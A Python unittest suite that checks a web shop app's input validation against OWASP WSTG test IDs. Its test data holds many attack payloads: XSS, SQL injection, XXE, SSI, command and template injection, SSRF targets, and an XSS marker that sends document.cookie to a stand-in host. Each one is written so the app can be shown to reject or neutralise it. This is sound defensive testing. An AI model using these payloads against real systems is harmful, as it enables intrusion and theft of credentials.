"""Automated checks for the hardened input handling, grouped by OWASP WSTG v4.2 test ID
(section 4.7: Input Validation Testing).

Tests for surfaces the app does not have (LDAP, XPath, XML parsing, SSI, mail, templates built
from input, ...) are "attempted X, got Y" checks: the payload goes in and must come back inert.

Run:  .venv/bin/python -m unittest discover -s tests -v
"""
import html
import os
import tempfile
import unittest
from unittest import mock

from test_auth_wstg import ALICE, ALICE_PW, Base, token_of  # noqa: F401  (sets the secure-mode test env)

from app.db import get_db

BOB, BOB_PW = "bob", "Bob-Purple-Tractor-3"
ADMIN, ADMIN_PW = "admin", "Adm1n-Correct-Horse-9"
CATEGORY = "خواربار ایرانی"
XSS = "<script>alert(1)</script>"


class InpvBase(Base):
    def setUp(self):
        super().setUp()
        self.uploads = tempfile.mkdtemp()
        self.app.config["UPLOAD_FOLDER"] = self.uploads

    def as_user(self, user, pw):
        c = self.app.test_client()
        self.assertEqual(self.login(user, pw, c).status_code, 302)
        return c

    def run_sql(self, sql, *a):
        with self.app.app_context():
            get_db().execute(sql, a)
            get_db().commit()

    def count(self, table):
        return self.q(f"SELECT COUNT(*) FROM {table}")[0][0]

    def text(self, response):
        return response.get_data(as_text=True)


class TestINPV01ReflectedXSS(InpvBase):
    PAYLOADS = [XSS, '"><img src=x onerror=alert(1)>', "'-alert(1)-'", "<svg/onload=alert(1)>", "javascript:alert(1)"]

    def test_search_term_is_html_encoded(self):
        for payload in self.PAYLOADS:
            body = self.text(self.c.get("/search", query_string={"q": payload}))
            self.assertNotIn(payload, body, payload) if "<" in payload or '"' in payload else None
            self.assertNotIn("<script>alert(1)</script>", body)
            self.assertNotIn("<img src=x", body)
            self.assertNotIn("<svg/onload", body)
        self.assertIn(html.escape(XSS), self.text(self.c.get("/search", query_string={"q": XSS})))

    def test_no_database_error_text_in_search(self):
        body = self.text(self.c.get("/search", query_string={"q": "'"}))
        self.assertNotIn("Debug info", body)
        self.assertNotIn("syntax", body.lower())


class TestINPV02StoredXSS(InpvBase):
    def review(self, c, body, rating="5", product=1, fresh=False):
        # The Phase 5 rules (one review per product, 3/hour, purchase required) are tested in
        # test_busl_wstg.py. `fresh` clears alice's earlier review so these tests stay about input.
        if fresh:
            self.run_sql("DELETE FROM reviews WHERE product_id = ? AND user_id = 2", product)
            self.run_sql("DELETE FROM auth_attempts WHERE kind = 'review'")
        return self.post(f"/product/{product}/review", {"body": body, "rating": rating}, c, f"/product/{product}")

    def test_review_is_stored_as_typed_and_encoded_for_every_viewer(self):
        alice = self.as_user(ALICE, ALICE_PW)
        self.assertEqual(self.review(alice, XSS, fresh=True).status_code, 302)
        self.assertEqual(self.q("SELECT body FROM reviews ORDER BY id DESC LIMIT 1")[0][0], XSS)
        for viewer in (alice, self.as_user(BOB, BOB_PW), self.app.test_client()):
            body = self.text(viewer.get("/product/1"))
            self.assertNotIn(XSS, body)
            self.assertIn(html.escape(XSS), body)

    def test_invalid_reviews_rejected(self):
        alice = self.as_user(ALICE, ALICE_PW)
        before = self.count("reviews")
        for body, rating in [("", "5"), ("   ", "5"), ("x" * 1001, "5"), ("ok", "0"), ("ok", "6"), ("ok", "-1"),
                             ("ok", "abc"), ("ok", "1e1")]:
            self.review(alice, body, rating)
        self.assertEqual(self.count("reviews"), before)

    def test_review_for_missing_product_is_404(self):
        alice = self.as_user(ALICE, ALICE_PW)
        tok = token_of(self.text(alice.get("/product/1")))
        r = alice.post("/product/9999/review", data={"body": "hi", "rating": "5", "csrf_token": tok})
        self.assertEqual(r.status_code, 404)

    def test_anonymous_cannot_review(self):
        r = self.c.post("/product/1/review", data={"body": "x", "csrf_token": "bad"})
        self.assertIn(r.status_code, (302, 400))
        self.assertEqual(self.count("reviews"), 2)


class TestINPV03VerbTampering(InpvBase):
    ROUTES = ["/admin/", "/admin/users", "/admin/products", "/admin/products/1/delete", "/admin/ping",
              "/admin/fetch-image", "/admin/reset", "/cart/add/1", "/product/1/review", "/account/change-password"]

    def test_unusual_verbs_never_succeed_or_change_state(self):
        alice = self.as_user(ALICE, ALICE_PW)
        products, users = self.count("products"), self.count("users")
        for client in (self.c, alice):
            for method in ("put", "delete", "patch", "trace", "propfind"):
                for path in self.ROUTES:
                    r = getattr(client, method)(path) if hasattr(client, method) else client.open(path, method=method.upper())
                    self.assertIn(r.status_code, (302, 400, 403, 404, 405), f"{method} {path}")
        self.assertEqual((self.count("products"), self.count("users")), (products, users))

    def test_head_and_options_do_not_bypass_admin_checks(self):
        alice = self.as_user(ALICE, ALICE_PW)
        self.assertEqual(alice.head("/admin/users").status_code, 403)
        self.assertEqual(self.c.head("/admin/users").status_code, 302)
        self.assertNotIn(b"admin@", alice.options("/admin/users").data)

    def test_state_changing_routes_refuse_get(self):
        alice = self.as_user(ALICE, ALICE_PW)
        for path in ("/cart/add/1", "/cart/remove/1", "/product/1/review", "/account/change-email",
                     "/account/change-password", "/account/avatar"):
            self.assertEqual(alice.get(path).status_code, 405, path)


class TestINPV04ParameterPollution(InpvBase):
    def add(self, c, qty, page="/product/2"):
        return self.post("/cart/add/2", {"qty": qty}, c, page)  # product 2: no per-customer limit

    def cart(self, c):
        with c.session_transaction() as s:
            return s.get("cart", {})

    def test_repeated_qty_is_rejected_not_first_or_last_wins(self):
        c = self.app.test_client()
        for pair in (["1", "-5"], ["-5", "1"], ["1", "9999"], ["1", "1"]):
            self.add(c, pair)
        self.assertEqual(self.cart(c), {})

    def test_only_a_plain_integer_in_range_is_accepted(self):
        c = self.app.test_client()
        for bad in ("-5", "0", "11", "abc", "1.5", "+1", " 1", "1 ", "٣", "1e1", "", "99999999999"):
            self.add(c, bad)
        self.assertEqual(self.cart(c), {})
        self.add(c, "3")
        self.assertEqual(self.cart(c), {"2": 3})

    def test_cart_line_total_is_capped_across_requests(self):
        c = self.app.test_client()
        self.add(c, "6")
        self.add(c, "6")
        self.assertEqual(self.cart(c), {"2": 6})

    def test_unknown_product_cannot_be_added(self):
        c = self.app.test_client()
        tok = token_of(self.text(c.get("/")))
        self.assertEqual(c.post("/cart/add/9999", data={"qty": "1", "csrf_token": tok}).status_code, 404)

    def test_duplicate_search_parameter_resolves_consistently(self):
        r = self.c.get("/search?q=zzz-first&q=<script>alert(1)</script>")
        body = self.text(r)
        self.assertEqual(r.status_code, 200)
        self.assertIn("zzz-first", body)
        self.assertNotIn("<script>alert(1)</script>", body)


class TestINPV05SQLInjection(InpvBase):
    LOGIN_PAYLOADS = ["' OR '1'='1' --", "admin' --", "admin'/*", "' OR 1=1 LIMIT 1 --", "\" OR \"\"=\"",
                      "'; DROP TABLE users; --", "admin' AND (SELECT 1)=1 --"]
    SEARCH_PAYLOADS = ["'", "' OR 1=1 --", "%' OR '1'='1", "' UNION SELECT id, username, password_hash, email, avatar FROM users --",
                       "' UNION SELECT 1,2,3,4,5 --", "'; DROP TABLE products; --"]

    def test_login_injection_never_authenticates(self):
        for n, payload in enumerate(self.LOGIN_PAYLOADS):
            for field in ("username", "password"):
                # a fresh unknown username each time keeps these attempts clear of the lockout
                data = {"username": f"nobody{n}{field}", "password": "x"}
                data[field] = payload
                c = self.app.test_client()
                self.assertEqual(self.post("/login", data, c, "/login").status_code, 401, payload)
                with c.session_transaction() as s:
                    self.assertNotIn("user_id", s)

    def test_search_injection_returns_no_foreign_rows_or_sql_errors(self):
        for payload in self.SEARCH_PAYLOADS:
            body = self.text(self.c.get("/search", query_string={"q": payload}))
            for leak in ("scrypt", "pbkdf", "@vulnershop.test", "sqlite", "syntax", "Traceback"):
                self.assertNotIn(leak, body, payload)
            self.assertNotIn('class="p-card"', body, payload)
        self.assertEqual(self.count("products") > 0 and self.count("users") > 0, True)  # tables survived

    def test_like_wildcards_are_literal(self):
        for q in ("%", "_", "\\"):
            self.assertNotIn('class="p-card"', self.text(self.c.get("/search", query_string={"q": q})), q)

    def test_normal_search_still_works(self):
        body = self.text(self.c.get("/search", query_string={"q": "JBL"}))
        self.assertIn('class="p-card"', body)


class TestINPV06To09UnreachableInterpreters(InpvBase):
    """LDAP, XML, SSI and XPath: nothing in the app feeds input to those interpreters."""

    def test_ldap_and_xpath_filter_payloads_are_just_bad_credentials(self):
        for payload in ["*)(uid=*))(|(uid=*", "*)(&", "admin)(&)", "' or '1'='1", "x' or name()='username' or 'x'='y", "//*"]:
            c = self.app.test_client()
            self.assertEqual(self.post("/login", {"username": payload, "password": "x"}, c, "/login").status_code, 401)

    def test_xml_and_xxe_bodies_are_stored_as_inert_text(self):
        xxe = '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><d>&x;</d>'
        r = self.post("/contact", {"name": "Eve", "email": "eve@example.com", "message": xxe}, page="/contact")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(self.q("SELECT message FROM contact_messages")[0][0], xxe)
        for path in ("/contact", "/", "/search?q=root"):
            self.assertNotIn("root:", self.text(self.c.get(path)))
        r = self.c.post("/search", data=xxe, content_type="application/xml")
        self.assertIn(r.status_code, (400, 405))  # no XML endpoint; the CSRF layer refuses it first

    def test_ssi_directives_are_not_executed(self):
        alice = self.as_user(ALICE, ALICE_PW)
        ssi = '<!--#exec cmd="id"--><!--#include virtual="/etc/passwd"-->'
        self.post("/product/1/review", {"body": ssi, "rating": "5"}, alice, "/product/1")
        for body in (self.text(alice.get("/product/1")), self.text(self.c.get("/search", query_string={"q": ssi}))):
            self.assertNotIn("uid=", body)
            self.assertNotIn("root:", body)
            self.assertNotIn(ssi, body)


class TestINPV10SMTPInjection(InpvBase):
    def send(self, **over):
        data = {"name": "Eve", "email": "eve@example.com", "message": "hello", **over}
        return self.post("/contact", data, page="/contact")

    def test_crlf_in_name_or_email_is_rejected(self):
        for field, value in [("name", "Eve\r\nBcc: victim@example.com"), ("email", "eve@example.com\r\nBcc: v@example.com"),
                             ("email", "eve@example.com%0aBcc:v@example.com"), ("name", "a\x00b"), ("email", "not-an-email"),
                             ("name", ""), ("message", ""), ("message", "x" * 2001), ("name", "n" * 101)]:
            self.assertEqual(self.send(**{field: value}).status_code, 400, (field, value))
        self.assertEqual(self.count("contact_messages"), 0)

    def test_valid_message_is_accepted_and_newlines_allowed_in_body(self):
        self.assertEqual(self.send(message="line one\r\nline two").status_code, 302)
        self.assertEqual(self.count("contact_messages"), 1)

    def test_contact_messages_are_never_rendered_back(self):
        self.send(message=XSS)
        admin = self.as_user(ADMIN, ADMIN_PW)
        for path in ("/admin/", "/admin/users", "/admin/orders", "/admin/products", "/contact"):
            self.assertNotIn(XSS, self.text(admin.get(path)), path)


class TestINPV11CodeInjectionAndFileInclusion(InpvBase):
    def test_include_style_parameters_never_read_files(self):
        paths = ["/?category=../../etc/passwd", "/?page=/etc/passwd", "/?file=../app/config.py", "/?lang=../../etc/passwd",
                 "/search?q=../../etc/passwd", "/set-language/..%2f..%2fetc%2fpasswd", "/product/..%2f..%2fapp%2fconfig.py",
                 "/?template=http://127.0.0.1/", "/?include=php://filter/resource=index.php"]
        for path in paths:
            r = self.c.get(path, headers={"Referer": "http://localhost/"})
            body = r.get_data(as_text=True)
            self.assertNotIn("root:", body, path)
            self.assertNotIn("SECRET_KEY", body, path)
            self.assertNotEqual(r.status_code, 500, path)

    def test_expression_payloads_are_not_evaluated(self):
        for payload in ("__import__('os').popen('id').read()", "${@print(1337*3)}", "1337*3", "eval('1337*3')"):
            body = self.text(self.c.get("/search", query_string={"q": payload}))
            self.assertNotIn("4011", body, payload)
            self.assertNotIn("uid=", body, payload)


class TestINPV12CommandInjection(InpvBase):
    def ping(self, c, host):
        return self.post("/admin/ping", {"host": host}, c, "/admin/ping")

    def test_metacharacters_are_rejected_and_nothing_is_executed(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        payloads = ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id", "$(id)", "`id`", "127.0.0.1\nid", "127.0.0.1 #",
                    "-c 100 127.0.0.1", "--help", "-f 127.0.0.1", "a b", "127.0.0.1>/tmp/x", "", "..", "-"]
        with mock.patch("app.admin.subprocess.run") as run:
            for host in payloads:
                self.assertEqual(self.ping(admin, host).status_code, 400, repr(host))
            run.assert_not_called()

    def test_valid_host_runs_without_a_shell(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        done = mock.Mock(stdout="1 packets transmitted", stderr="")
        with mock.patch("app.admin.subprocess.run", return_value=done) as run:
            for host in ("127.0.0.1", "example.com", "my-host.internal"):
                self.assertEqual(self.ping(admin, host).status_code, 200)
            args, kwargs = run.call_args
            self.assertEqual(args[0], ["ping", "-c", "1", "my-host.internal"])
            self.assertFalse(kwargs["shell"])


class TestINPV13FormatStrings(InpvBase):
    PAYLOADS = ["%s%s%s%n%x", "{0}{1}{2}", "{0.__class__}", "{{config}}", "{app.config}", "%(SECRET_KEY)s", "{user.password_hash}"]

    def test_format_specifiers_are_plain_text_everywhere(self):
        alice = self.as_user(ALICE, ALICE_PW)
        for payload in self.PAYLOADS:
            self.run_sql("DELETE FROM reviews WHERE product_id = 1 AND user_id = 2")  # one review per customer (BUSL-05)
            self.run_sql("DELETE FROM auth_attempts WHERE kind IN ('review', 'contact')")
            self.post("/product/1/review", {"body": payload, "rating": "5"}, alice, "/product/1")
            self.post("/contact", {"name": payload, "email": "a@example.com", "message": payload}, page="/contact")
            pages = [self.text(alice.get("/product/1")), self.text(self.c.get("/search", query_string={"q": payload}))]
            for body in pages:
                self.assertIn(html.escape(payload), body, payload)
                for evaluated in ("&lt;class", "&lt;Config", "scrypt", "pbkdf"):  # what a format() would leak
                    self.assertNotIn(evaluated, body, payload)
        self.assertEqual(self.q("SELECT body FROM reviews ORDER BY id DESC LIMIT 1")[0][0], self.PAYLOADS[-1])


class TestINPV14IncubatedVulnerabilities(InpvBase):
    def test_planted_payloads_stay_inert_for_later_visitors(self):
        alice = self.as_user(ALICE, ALICE_PW)
        marker = '<img src=x onerror="fetch(\'//evil.test/\'+document.cookie)">'
        self.run_sql("DELETE FROM reviews WHERE product_id = 1 AND user_id = 2")  # alice bought product 1 (BUSL-06)
        self.post("/product/1/review", {"body": marker, "rating": "5"}, alice, "/product/1")
        self.post("/contact", {"name": "Eve", "email": "eve@example.com", "message": marker}, page="/contact")
        admin = self.as_user(ADMIN, ADMIN_PW)
        for client in (self.as_user(BOB, BOB_PW), admin, self.app.test_client()):
            body = self.text(client.get("/product/1"))
            self.assertNotIn("<img src=x", body)
            self.assertIn("&lt;img src=x", body)

    def test_fetched_images_cannot_carry_scripts(self):
        # Only raster image types are stored, so an SVG/HTML "image" cannot be planted via the fetcher.
        self.assertNotIn("image/svg+xml", __import__("app.validation", fromlist=["x"]).IMAGE_TYPES)


class TestINPV15HeaderInjection(InpvBase):
    def test_crlf_in_urls_and_parameters_cannot_add_headers_or_cookies(self):
        paths = ["/set-language/en%0d%0aSet-Cookie:%20pwned=1", "/search?q=%0d%0aX-Injected:%201", "/product/1%0d%0aX-Injected:%201",
                 "/?category=%0d%0aSet-Cookie:%20pwned=1", "/login?next=%0d%0aLocation:%20http://evil.test"]
        for path in paths:
            r = self.c.get(path, headers={"Referer": "http://localhost/"})
            self.assertNotIn("X-Injected", r.headers, path)
            self.assertNotIn("pwned", r.headers.get("Set-Cookie", ""), path)
            self.assertNotIn("evil.test", r.headers.get("Location", ""), path)

    def test_conflicting_framing_headers_are_not_honoured_in_app_logic(self):
        r = self.c.post("/search", data="x", headers={"Transfer-Encoding": "chunked", "Content-Length": "1"})
        self.assertIn(r.status_code, (400, 405, 411, 501))


class TestINPV17HostHeader(InpvBase):
    def test_unknown_host_is_refused(self):
        for host in ("evil.example", "localhost.evil.example", "evil.example:5000", "127.0.0.1.evil.example"):
            self.assertEqual(self.c.get("/", base_url=f"http://{host}").status_code, 400, host)
        for host in ("localhost", "localhost:5000", "127.0.0.1:5000", "[::1]:5000"):
            self.assertEqual(self.c.get("/", base_url=f"http://{host}").status_code, 200, host)

    def test_reset_link_is_built_on_the_trusted_host_even_with_forwarding_headers(self):
        hdrs = {"X-Forwarded-Host": "evil.example", "X-Forwarded-Proto": "https", "X-Original-Host": "evil.example"}
        tok = token_of(self.text(self.c.get("/forgot-password")))
        with self.assertLogs("vulnershop.mail", "INFO") as cm:
            self.c.post("/forgot-password", data={"username": ALICE, "csrf_token": tok}, headers=hdrs)
        mail = "\n".join(cm.output)
        self.assertIn("http://localhost/reset-password/", mail)
        self.assertNotIn("evil.example", mail)

    def test_poisoned_host_cannot_trigger_a_reset_mail(self):
        tok = token_of(self.text(self.c.get("/forgot-password")))
        r = self.c.post("/forgot-password", data={"username": ALICE, "csrf_token": tok}, base_url="http://evil.example")
        self.assertEqual(r.status_code, 400)
        self.assertEqual(self.q("SELECT COUNT(*) FROM password_resets")[0][0], 0)


class TestINPV18TemplateInjection(InpvBase):
    PAYLOADS = ["{{7*191}}", "${7*191}", "#{7*191}", "<%= 7*191 %>", "{{config}}", "{{''.__class__.__mro__}}", "{%25 for x in ().__class__ %25}"]

    def test_template_syntax_is_never_evaluated(self):
        alice = self.as_user(ALICE, ALICE_PW)
        for payload in self.PAYLOADS:
            self.post("/product/1/review", {"body": payload, "rating": "5"}, alice, "/product/1")
            self.post("/contact", {"name": "Eve", "email": "e@example.com", "message": payload}, page="/contact")
            pages = [self.c.get("/search", query_string={"q": payload}), alice.get("/product/1"),
                     self.c.get("/" + payload), self.c.get("/product/" + payload), alice.get("/profile/" + payload)]
            for r in pages:
                body = r.get_data(as_text=True)
                self.assertNotIn("1337", body, payload)
                self.assertNotIn("SECRET_KEY", body, payload)
                self.assertNotIn("&lt;class &#39;str", body, payload)
                self.assertLess(r.status_code, 500, payload)


class TestINPV19ServerSideRequestForgery(InpvBase):
    BLOCKED = ["http://127.0.0.1:5000/admin/users", "http://localhost/", "http://localhost:5000/admin/", "http://169.254.169.254/latest/meta-data/",
               "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://2130706433/", "http://0x7f.0.0.1/",  # octal spellings are resolver-dependent, so not listed
               "http://0/", "http://10.0.0.5/", "http://192.168.1.1/", "http://172.16.0.1/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_PING",
               "ftp://example.com/x.png", "http://user:pw@127.0.0.1/", "dict://127.0.0.1:11211/", "http:///etc/passwd", "", "not a url",
               "http://127.0.0.1#@example.com/", "http://example.com@127.0.0.1/"]

    def fetch(self, c, url):
        return self.post("/admin/fetch-image", {"url": url}, c, "/admin/fetch-image")

    @staticmethod
    def _answer(host_ips):
        return lambda host, port, **kw: [(2, 1, 6, "", (ip, port)) for ip in host_ips]

    def _image(self, ctype="image/png", status=200, body=b"\x89PNG\r\n"):
        resp = mock.Mock(status_code=status, headers={"Content-Type": ctype})
        resp.raw.read.return_value = body
        return resp

    def test_internal_and_non_http_targets_are_refused_before_any_request(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        with mock.patch("app.admin.requests.get") as get:
            for url in self.BLOCKED:
                self.assertEqual(self.fetch(admin, url).status_code, 400, url)
            get.assert_not_called()
        self.assertEqual(os.listdir(self.uploads), [])

    def test_hostname_resolving_to_a_private_address_is_refused(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        for ips in (["127.0.0.1"], ["10.1.2.3"], ["93.184.216.34", "127.0.0.1"], ["169.254.169.254"], ["::1"]):
            with mock.patch("app.validation.socket.getaddrinfo", self._answer(ips)), mock.patch("app.admin.requests.get") as get:
                self.assertEqual(self.fetch(admin, "http://rebind.example/a.png").status_code, 400, ips)
                get.assert_not_called()

    def test_public_image_is_fetched_without_redirects_and_stored_under_a_server_name(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        with mock.patch("app.validation.socket.getaddrinfo", self._answer(["93.184.216.34"])), \
                mock.patch("app.admin.requests.get", return_value=self._image()) as get:
            r = self.fetch(admin, "https://img.example/../../evil.svg?x=.html")
            self.assertEqual(r.status_code, 200)
            self.assertFalse(get.call_args.kwargs["allow_redirects"])
        names = os.listdir(self.uploads)
        self.assertEqual(len(names), 1)
        self.assertRegex(names[0], r"^fetched_\d+\.png$")

    def test_non_image_redirect_and_oversize_responses_are_discarded(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        cases = [self._image("text/html"), self._image("image/svg+xml", body=b"<svg onload=alert(1)/>"), self._image(status=302),
                 self._image(body=b"x" * (2 * 1024 * 1024 + 1)), self._image("")]
        for resp in cases:
            with mock.patch("app.validation.socket.getaddrinfo", self._answer(["93.184.216.34"])), \
                    mock.patch("app.admin.requests.get", return_value=resp):
                self.assertEqual(self.fetch(admin, "http://img.example/a").status_code, 400)
        self.assertEqual(os.listdir(self.uploads), [])


class TestInputValidationMisc(InpvBase):
    def test_malformed_ids_give_404_not_a_stack_trace(self):
        for path in ("/product/abc", "/product/1e3", "/product/-1", "/product/%C2%B2", "/product/99999999999", "/product/1'", "/product/0x1"):
            r = self.c.get(path)
            self.assertEqual(r.status_code, 404, path)
            self.assertNotIn("Traceback", r.get_data(as_text=True))

    def test_admin_product_form_validates_types_ranges_and_categories(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        before = self.count("products")
        good = {"name": "ok", "price": "5", "description": "d", "category": CATEGORY}
        for over in ({"price": "abc"}, {"price": "-1"}, {"price": "0"}, {"price": "nan"}, {"price": "inf"}, {"price": "1e99"}, {"name": ""},
                     {"name": "n" * 121}, {"category": "<script>"}, {"description": "d" * 1001}):
            r = self.post("/admin/products", {**good, **over}, admin, "/admin/products")
            self.assertEqual(r.status_code, 302, over)
        self.assertEqual(self.count("products"), before)
        self.post("/admin/products", good, admin, "/admin/products")
        self.assertEqual(self.count("products"), before + 1)

    def test_product_name_is_encoded_on_the_listing(self):
        admin = self.as_user(ADMIN, ADMIN_PW)
        self.exec_sql("INSERT INTO products (name, description, price, category, image) VALUES (?, ?, 1, ?, 'placeholder.svg')",
                      XSS, XSS, CATEGORY)
        for path in ("/", "/admin/products", "/search?q=alert"):
            self.assertNotIn(XSS, self.text(admin.get(path)), path)

    def exec_sql(self, sql, *args):
        with self.app.app_context():
            from app.db import get_db
            get_db().execute(sql, args)
            get_db().commit()


if __name__ == "__main__":
    unittest.main()
